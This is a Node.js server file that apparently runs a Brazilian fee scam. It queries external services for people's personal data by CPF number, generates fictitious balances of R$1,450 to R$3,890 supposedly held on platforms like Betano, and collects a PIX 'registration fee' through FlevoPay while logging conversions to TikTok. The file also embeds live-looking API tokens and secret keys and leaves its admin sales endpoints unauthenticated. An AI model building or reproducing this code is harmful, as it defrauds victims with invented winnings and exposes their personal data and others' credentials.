const http = require('http');
const fs = require('fs');
const path = require('path');
const https = require('https');
const url = require('url');
const store = require('./store');
const { sendPurchaseEvent, sendInitiateCheckoutEvent, sendViewContentEvent, parseCookie } = require('./tiktok-capi');
const salesDb = require('./sales_db');

const PORT = process.env.PORT || 3001;
const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.svg': 'image/svg+xml',
  '.webp': 'image/webp'
};

const customCpfsPath = path.join(__dirname, 'custom_cpfs.json');
const configPath = path.join(__dirname, 'config.json');
const balancesPath = path.join(__dirname, 'balances.json');

function getCustomCpfs() {
  try {
    if (fs.existsSync(customCpfsPath)) {
      return JSON.parse(fs.readFileSync(customCpfsPath, 'utf8'));
    }
  } catch (e) {
    console.error('Error reading custom_cpfs.json:', e.message);
  }
  return {};
}

function saveCustomCpf(cpf, name) {
  try {
    const data = getCustomCpfs();
    const cleanCpf = cpf.replace(/\D/g, '');
    data[cleanCpf] = name.trim().toUpperCase();
    fs.writeFileSync(customCpfsPath, JSON.stringify(data, null, 2), 'utf8');
    return true;
  } catch (e) {
    console.error('Error saving custom_cpfs.json:', e.message);
    return false;
  }
}

function getBalances() {
  try {
    if (fs.existsSync(balancesPath)) {
      return JSON.parse(fs.readFileSync(balancesPath, 'utf8'));
    }
  } catch (e) {
    console.error('Error reading balances.json:', e.message);
  }
  return {};
}

function getOrGenerateBalance(identifier, platformId) {
  try {
    const balances = getBalances();
    const cleanKey = identifier.replace(/\D/g, '') || identifier.trim().toLowerCase();
    const platKey = platformId.trim().toLowerCase();

    if (!balances[cleanKey]) {
      balances[cleanKey] = {};
    }

    if (balances[cleanKey][platKey]) {
      return {
        amount: balances[cleanKey][platKey],
        isFirstTime: false
      };
    }

    // Generate a fixed realistic amount between R$ 1.450,00 and R$ 3.890,00
    const rawVal = (Math.random() * (3890 - 1450) + 1450).toFixed(2);
    const amountNum = parseFloat(rawVal);

    balances[cleanKey][platKey] = amountNum;
    fs.writeFileSync(balancesPath, JSON.stringify(balances, null, 2), 'utf8');

    return {
      amount: amountNum,
      isFirstTime: true
    };
  } catch (e) {
    console.error('Error handling balance:', e.message);
    return { amount: 2749.80, isFirstTime: true };
  }
}

function getConfig() {
  try {
    if (fs.existsSync(configPath)) {
      return JSON.parse(fs.readFileSync(configPath, 'utf8'));
    }
  } catch (e) {}
  return {
    api_provider: 'zapgroup',
    api_url: 'https://api.zapgroup.shop/consultar-filtrada/cpf?cpf={cpf}&token={token}',
    api_token: 'c93601cbe0fce3f5c5b1e3b40c840f500fb162f91103beb42e839b7839813f93',
    flevopay: {
      secret_key: 'sk_fdc7594e7eb1486ea3e282cc0a8249b55f1e0270b6844a8f506060f75d529968',
      api_url: 'https://app.flevopay.com.br/api/v1/transaction'
    }
  };
}

function queryExternalApi(apiUrl, timeoutMs) {
  const ms = timeoutMs || 25000;
  return new Promise((resolve, reject) => {
    const req = https.get(apiUrl, { timeout: ms }, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          resolve(JSON.parse(body));
        } catch (e) {
          resolve({ raw: body });
        }
      });
    });
    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Timeout na consulta da API'));
    });
    req.on('error', reject);
  });
}

function createFlevoPixTransaction(payload, secretKey) {
  return new Promise((resolve, reject) => {
    const postData = JSON.stringify(payload);

    const options = {
      hostname: 'app.flevopay.com.br',
      port: 443,
      path: '/api/v1/transaction',
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'X-API-Key': secretKey,
        'Content-Length': Buffer.byteLength(postData)
      },
      timeout: 12000
    };

    const req = https.request(options, (res) => {
      let body = '';
      res.on('data', chunk => body += chunk);
      res.on('end', () => {
        try {
          resolve({ statusCode: res.statusCode, data: JSON.parse(body) });
        } catch (e) {
          resolve({ statusCode: res.statusCode, raw: body });
        }
      });
    });

    req.on('timeout', () => {
      req.destroy();
      reject(new Error('Timeout na comunicação com a FlevoPay'));
    });

    req.on('error', reject);
    req.write(postData);
    req.end();
  });
}

const server = http.createServer(async (req, res) => {
  const parsedUrl = url.parse(req.url, true);
  const pathname = parsedUrl.pathname;

  // CORS headers
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-API-Key');

  if (req.method === 'OPTIONS') {
    res.writeHead(204);
    return res.end();
  }

  // API Route: Consulta CPF (Nome)
  if (pathname === '/api/consulta-cpf' && req.method === 'GET') {
    const rawCpf = (parsedUrl.query.cpf || '').replace(/\D/g, '');
    
    if (rawCpf.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: 'CPF deve conter 11 dígitos' }));
    }

    // 1. Local Cache
    const customCpfs = getCustomCpfs();
    if (customCpfs[rawCpf]) {
      console.log(`[Cache Local] CPF ${rawCpf}: ${customCpfs[rawCpf]}`);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({
        success: true,
        cpf: rawCpf,
        nome: customCpfs[rawCpf],
        source: 'local_cache'
      }));
    }

    // 2. ZapGroup / External API
    const config = getConfig();
    if (config.api_token && config.api_url) {
      try {
        const fullUrl = config.api_url.replace('{cpf}', rawCpf).replace('{token}', config.api_token);
        console.log(`[API Externa] Consultando CPF ${rawCpf}...`);
        
        const apiRes = await queryExternalApi(fullUrl);
        console.log('[API Externa] Resposta:', JSON.stringify(apiRes));

        let foundName = null;
        if (apiRes && apiRes.nome && typeof apiRes.nome === 'string') {
          foundName = apiRes.nome;
        } else if (apiRes && apiRes.Nome && typeof apiRes.Nome === 'string') {
          foundName = apiRes.Nome;
        } else if (apiRes && apiRes.result) {
          foundName = apiRes.result.nome_da_pf || apiRes.result.nome || apiRes.result.nome_completo || apiRes.result.Nome;
        } else if (apiRes && apiRes.DADOS && apiRes.DADOS.nome) {
          foundName = apiRes.DADOS.nome;
        } else if (apiRes && (apiRes.nome || apiRes.nome_completo || apiRes.name)) {
          foundName = apiRes.nome || apiRes.nome_completo || apiRes.name;
        }

        if (foundName && typeof foundName === 'string') {
          const cleanName = foundName.trim().toUpperCase();
          saveCustomCpf(rawCpf, cleanName);
          console.log(`[API Externa] Nome localizado com sucesso: ${cleanName}`);
          
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({
            success: true,
            cpf: rawCpf,
            nome: cleanName,
            mae: apiRes.mae || null,
            sexo: apiRes.sexo || null,
            nascimento: apiRes.nascimento || null,
            source: 'zapgroup'
          }));
        }
      } catch (err) {
        console.error('[API Externa] Erro na consulta:', err.message);
      }
    }

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      success: true,
      cpf: rawCpf,
      nome: null,
      source: 'none'
    }));
  }

  // API Route: Proxy para API Xtudo (evita CORS no browser)
  if (pathname === '/api/xtudo' && req.method === 'GET') {
    const rawCpf = (parsedUrl.query.cpf || '').replace(/\D/g, '');

    if (rawCpf.length !== 11) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, error: 'CPF inválido' }));
    }

    try {
      const xtudoUrl = `https://base4.sistemafullativo.online:81/api/xtudo?CPF=${rawCpf}&token=15FFEA2609`;
      console.log(`[Xtudo Proxy] Consultando CPF ${rawCpf}...`);
      const apiRes = await queryExternalApi(xtudoUrl);
      console.log('[Xtudo Proxy] Resposta recebida.');

      let foundName = null;
      if (apiRes && apiRes.resultados) {
        if (apiRes.resultados[0] && apiRes.resultados[0].NOME && typeof apiRes.resultados[0].NOME === 'string') {
          foundName = apiRes.resultados[0].NOME;
        } else if (Array.isArray(apiRes.resultados[0]) && apiRes.resultados[0][0] && apiRes.resultados[0][0].nome) {
          foundName = apiRes.resultados[0][0].nome;
        }
        if (!foundName) {
          for (const item of apiRes.resultados) {
            if (item && item.NOME && typeof item.NOME === 'string') { foundName = item.NOME; break; }
            if (item && item.nome && typeof item.nome === 'string') { foundName = item.nome; break; }
            if (Array.isArray(item)) {
              for (const sub of item) {
                if (sub && sub.NOME && typeof sub.NOME === 'string') { foundName = sub.NOME; break; }
                if (sub && sub.nome && typeof sub.nome === 'string') { foundName = sub.nome; break; }
              }
              if (foundName) break;
            }
          }
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: true, nome: foundName ? foundName.toUpperCase() : null, raw: apiRes }));
    } catch (err) {
      console.error('[Xtudo Proxy] Erro:', err.message);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ success: false, nome: null, error: err.message }));
    }
  }

  // API Route: Obter / Persistir Saldo Fixo por Pessoa e por Plataforma
  if (pathname === '/api/obter-saldo' && req.method === 'GET') {
    const rawCpf = (parsedUrl.query.cpf || '').replace(/\D/g, '');
    const email = (parsedUrl.query.email || '').trim().toLowerCase();
    const platform = (parsedUrl.query.platform || 'betano').trim().toLowerCase();

    const identifier = rawCpf.length === 11 ? rawCpf : (email || 'anonimo');
    const { amount, isFirstTime } = getOrGenerateBalance(identifier, platform);

    const formatted = Number(amount).toLocaleString('pt-BR', {
      style: 'currency',
      currency: 'BRL'
    });

    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({
      success: true,
      identifier: identifier,
      platform: platform,
      amount: amount,
      formattedAmount: formatted,
      isFirstTime: isFirstTime
    }));
  }

  // API Route: Criar Transação PIX FlevoPay (com aliases para compatibilidade)
  if ((pathname === '/api/gerar-pix-flevopay' || pathname === '/api/gerar-pix-freepay' || pathname === '/api/gerar-pix') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const payload = JSON.parse(body || '{}');
        const config = getConfig();
        const flevoConfig = config.flevopay || {};
        const secretKey = flevoConfig.secret_key || 'sk_fdc7594e7eb1486ea3e282cc0a8249b55f1e0270b6844a8f506060f75d529968';

        if (!secretKey) {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({
            success: false,
            waiting_keys: true,
            message: 'Secret Key da FlevoPay não configurada.'
          }));
        }

        const cleanCpf = (payload.cpf || '').replace(/\D/g, '') || '00000000000';
        const cleanName = (payload.name || 'Cliente').trim();
        const cleanEmail = (payload.email || 'cliente@email.com').trim();
        const cleanPhone = (payload.phone || '11999999999').replace(/\D/g, '') || '11999999999';
        const amountCents = payload.amountInCents || 2992; // R$ 29,92
        const amountReais = (amountCents / 100).toFixed(2);
        const refId = `REF_${Date.now()}_${cleanCpf.substring(0, 5) || 'USR'}`;

        const requestBody = {
          amount: amountCents,
          description: payload.description || 'Taxa de Registro e Regularização Cadastral',
          reference: refId,
          source: 'api_externa',
          customer: {
            name: cleanName,
            email: cleanEmail,
            document: cleanCpf,
            phone: cleanPhone
          },
          tracking: {
            utm_source: payload.utm_source || '',
            utm_campaign: payload.utm_campaign || '',
            utm_medium: payload.utm_medium || '',
            utm_content: payload.utm_content || '',
            utm_term: payload.utm_term || '',
            src: payload.src || '',
            sck: payload.sck || ''
          }
        };

        console.log('[FlevoPay] Criando transação PIX:', JSON.stringify(requestBody));
        const apiResponse = await createFlevoPixTransaction(requestBody, secretKey);
        console.log('[FlevoPay] Resposta da API:', JSON.stringify(apiResponse));

        if (apiResponse.data && (apiResponse.data.status === 'success' || apiResponse.data.qr_code || apiResponse.data.transaction_id)) {
          const resData = apiResponse.data;
          const txId = resData.transaction_id || resData.id || refId;
          const qrCodeText = resData.qr_code || '';
          const qrCodeImage = resData.qr_code_base64 || (qrCodeText ? `https://api.qrserver.com/v1/create-qr-code/?size=240x240&data=${encodeURIComponent(qrCodeText)}` : '');

          const clientIp    = (req.headers['x-forwarded-for'] || req.headers['x-real-ip'] || '').split(',')[0].trim();
          const userAgent   = req.headers['user-agent'] || '';
          const cookieStr   = req.headers.cookie || '';
          const ttclid      = payload.ttclid || parseCookie(cookieStr, '_ttclid') || '';
          const ttp         = payload.ttp    || parseCookie(cookieStr, '_ttp')    || '';

          // Salva dados no store para uso pelo check-status e webhook
          store.set(txId, {
            ttclid, ttp, amount: amountReais,
            email: cleanEmail, phone: cleanPhone, doc: cleanCpf,
            ip: clientIp, userAgent, capiSent: false
          });

          // Dispara InitiateCheckout (gerou o PIX = iniciou o checkout)
          sendInitiateCheckoutEvent({
            email: cleanEmail, phone: cleanPhone, doc: cleanCpf,
            amount: amountReais, txId, ttclid, ttp, ip: clientIp, userAgent
          }).catch(e => console.error('[CAPI] InitiateCheckout error:', e.message));

          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({
            success: true,
            transaction_id: txId,
            reference: refId,
            status: resData.status || 'pending',
            qr_code_image: qrCodeImage,
            qr_code_text: qrCodeText,
            amount: parseFloat(amountReais)
          }));
        } else {
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({
            success: false,
            error: apiResponse.data?.message || apiResponse.data || 'Erro ao gerar PIX na FlevoPay'
          }));
        }
      } catch (err) {
        console.error('[FlevoPay] Erro interno:', err.message);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ success: false, error: err.message }));
      }
    });
    return;
  }

  // API Route: Verificar status do pagamento FlevoPay + disparar CompletePayment CAPI
  if (pathname === '/api/check-status' && req.method === 'GET') {
    const txId = parsedUrl.query.id || '';
    if (!txId) {
      res.writeHead(400, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: 'Missing transaction id' }));
    }

    try {
      const config = getConfig();
      const flevoConfig = config.flevopay || {};
      const secretKey = flevoConfig.secret_key || 'sk_fdc7594e7eb1486ea3e282cc0a8249b55f1e0270b6844a8f506060f75d529968';

      const checkResp = await new Promise((resolve, reject) => {
        const options = {
          hostname: 'app.flevopay.com.br',
          port: 443,
          path: `/api/v1/query?action=get_transaction&id=${encodeURIComponent(txId)}`,
          method: 'GET',
          headers: {
            'X-API-Key': secretKey,
            'Content-Type': 'application/json'
          },
          timeout: 8000
        };
        const r = https.request(options, (resp) => {
          let body = '';
          resp.on('data', c => body += c);
          resp.on('end', () => {
            try { resolve(JSON.parse(body)); } catch(e) { resolve({ raw: body }); }
          });
        });
        r.on('timeout', () => { r.destroy(); reject(new Error('timeout')); });
        r.on('error', reject);
        r.end();
      });

      const rawData  = checkResp || {};
      const txStatus = (rawData.status || '').toUpperCase();

      console.log(`[check-status] tx: ${txId} | status: ${txStatus}`);

      if (txStatus === 'APPROVED' || txStatus === 'PAID') {
        // Dispara CompletePayment uma única vez (anti-duplicidade)
        let txData = store.get(txId);
        if (!txData) {
          const fallbackAmount = rawData.amount ? parseFloat(rawData.amount) / 100 : 29.92;
          txData = {
            capiSent: false, amount: fallbackAmount,
            email: rawData.customer_data?.customer?.email || rawData.customer?.email || '',
            phone: rawData.customer_data?.customer?.phone || rawData.customer?.phone || '',
            doc:   rawData.customer_data?.customer?.document || rawData.customer?.document || '',
            ip: '', userAgent: '', ttclid: ''
          };
        }
        if (!txData.capiSent) {
          store.set(txId, { ...txData, capiSent: true });

          // Salva venda no banco (status pending antes de disparar)
          salesDb.saveSale(txId, { ...txData, source: 'polling' }, 'pending', null);

          sendPurchaseEvent({
            email: txData.email, phone: txData.phone, doc: txData.doc,
            amount: txData.amount, txId,
            ttclid: txData.ttclid, ttp: txData.ttp || '', ip: txData.ip, userAgent: txData.userAgent
          }).then(capiRes => {
            const ok = capiRes && capiRes.code === 0;
            salesDb.updateCapiStatus(txId, ok ? 'sent' : 'error', capiRes);
            console.log(`[SalesDB] Polling CAPI ${ok ? '✅ sent' : '❌ error'} | tx: ${txId}`);
          }).catch(e => {
            salesDb.updateCapiStatus(txId, 'error', { error: e.message });
            console.error('[CAPI] Purchase (polling) error:', e.message);
          });
        }
      }

      res.writeHead(200, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ status: txStatus.toLowerCase(), raw: rawData }));
    } catch (err) {
      console.error('[check-status] Erro:', err.message);
      res.writeHead(500, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: err.message }));
    }
  }

  // API Route: Webhook FlevoPay — disparo garantido de CompletePayment
  if ((pathname === '/api/webhook-flevopay' || pathname === '/api/webhook-freepay' || pathname === '/api/webhook') && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const data  = JSON.parse(body || '{}');
        const inner = data.data || data;
        const txId  = inner.transaction_id || inner.id || inner.external_id || '';
        const status = (inner.status || '').toUpperCase();

        console.log(`[Webhook FlevoPay] tx: ${txId} | status: ${status}`);

        if (!txId) {
          res.writeHead(400, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ error: 'Missing transaction ID' }));
        }

        if (status === 'PAID' || status === 'APPROVED') {
          let txData = store.get(txId);
          if (!txData) {
            const rawAmount = inner.amount ? (inner.amount > 500 ? parseFloat(inner.amount) / 100 : parseFloat(inner.amount)) : 29.92;
            txData = {
              capiSent: false,
              amount:    rawAmount,
              email:     inner.customer?.email || '',
              phone:     inner.customer?.phone || '',
              doc:       inner.customer?.document || '',
              ip: '', userAgent: '', ttclid: '', ttp: ''
            };
          }
          if (!txData.capiSent) {
            store.set(txId, { ...txData, capiSent: true });

            // Salva venda no banco (status pending antes de disparar)
            salesDb.saveSale(txId, { ...txData, source: 'webhook' }, 'pending', null);

            sendPurchaseEvent({
              email: txData.email, phone: txData.phone, doc: txData.doc,
              amount: txData.amount, txId,
              ttclid: txData.ttclid, ttp: txData.ttp || '', ip: txData.ip, userAgent: txData.userAgent
            }).then(capiRes => {
              const ok = capiRes && capiRes.code === 0;
              salesDb.updateCapiStatus(txId, ok ? 'sent' : 'error', capiRes);
              console.log(`[SalesDB] Webhook CAPI ${ok ? '✅ sent' : '❌ error'} | tx: ${txId}`);
            }).catch(e => {
              salesDb.updateCapiStatus(txId, 'error', { error: e.message });
              console.error('[Webhook CAPI] error:', e.message);
            });
          }
        }

        res.writeHead(200, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ received: true }));
      } catch (err) {
        console.error('[Webhook] Error:', err);
        res.writeHead(500, { 'Content-Type': 'application/json' });
        return res.end(JSON.stringify({ error: 'Internal Server Error' }));
      }
    });
    return;
  }

  // API Route: Salvar CPF Manual
  if (pathname === '/api/salvar-cpf' && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', () => {
      try {
        const payload = JSON.parse(body);
        if (payload.cpf && payload.nome) {
          saveCustomCpf(payload.cpf, payload.nome);
          res.writeHead(200, { 'Content-Type': 'application/json' });
          return res.end(JSON.stringify({ success: true, cpf: payload.cpf, nome: payload.nome.toUpperCase() }));
        }
      } catch (e) {}
      res.writeHead(400, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: 'Dados inválidos' }));
    });
    return;
  }

  // ──────────────────────────────────────────────────────────────────
  // API Admin: Banco de Vendas
  // ──────────────────────────────────────────────────────────────────

  // GET /api/admin/sales — lista todas as vendas
  if (pathname === '/api/admin/sales' && req.method === 'GET') {
    const stats  = salesDb.getStats();
    const sales  = salesDb.getAllSales();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ stats, sales }, null, 2));
  }

  // GET /api/admin/sales/pending — vendas com CAPI pendente ou erro
  if (pathname === '/api/admin/sales/pending' && req.method === 'GET') {
    const pending = salesDb.getPendingSales();
    res.writeHead(200, { 'Content-Type': 'application/json' });
    return res.end(JSON.stringify({ count: pending.length, sales: pending }, null, 2));
  }

  // POST /api/admin/sales/retry/:txId — reenviar CAPI manualmente
  if (pathname.startsWith('/api/admin/sales/retry/') && req.method === 'POST') {
    const txId = pathname.replace('/api/admin/sales/retry/', '').trim();
    const sale = salesDb.getSale(txId);
    if (!sale) {
      res.writeHead(404, { 'Content-Type': 'application/json' });
      return res.end(JSON.stringify({ error: `Venda ${txId} não encontrada no banco` }));
    }
    console.log(`[Admin] Reenvio manual CAPI | tx: ${txId}`);
    sendPurchaseEvent({
      email: sale.email, phone: sale.phone, doc: sale.doc,
      amount: sale.amount, txId,
      ttclid: sale.ttclid, ip: sale.ip, userAgent: sale.userAgent
    }).then(capiRes => {
      const ok = capiRes && capiRes.code === 0;
      salesDb.updateCapiStatus(txId, ok ? 'sent' : 'error', capiRes);
      res.writeHead(200, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: ok, txId, capiCode: capiRes?.code, capiMsg: capiRes?.message }));
    }).catch(e => {
      salesDb.updateCapiStatus(txId, 'error', { error: e.message });
      res.writeHead(500, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ success: false, error: e.message }));
    });
    return;
  }

  // Static File Serving
  let filePath = path.join(__dirname, pathname === '/' ? 'index.html' : pathname);
  const ext = path.extname(filePath);
  const contentType = MIME_TYPES[ext] || 'application/octet-stream';

  fs.readFile(filePath, (err, content) => {
    if (err) {
      if (err.code === 'ENOENT') {
        // Se for uma requisição de página/rota (sem extensão ou .html), redireciona pra home mantendo as UTMs
        if (!ext || ext === '.html') {
          const redirectUrl = '/' + (parsedUrl.search || '');
          res.writeHead(302, { 'Location': redirectUrl });
          return res.end();
        }
        // Senão, é um arquivo estático faltando, devolve 404
        res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
        return res.end('404 Not Found');
      } else {
        res.writeHead(500);
        return res.end(`Server Error: ${err.code}`);
      }
    } else {
      res.writeHead(200, { 'Content-Type': contentType });
      res.end(content, 'utf-8');
    }
  });
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
  });
}

module.exports = server;
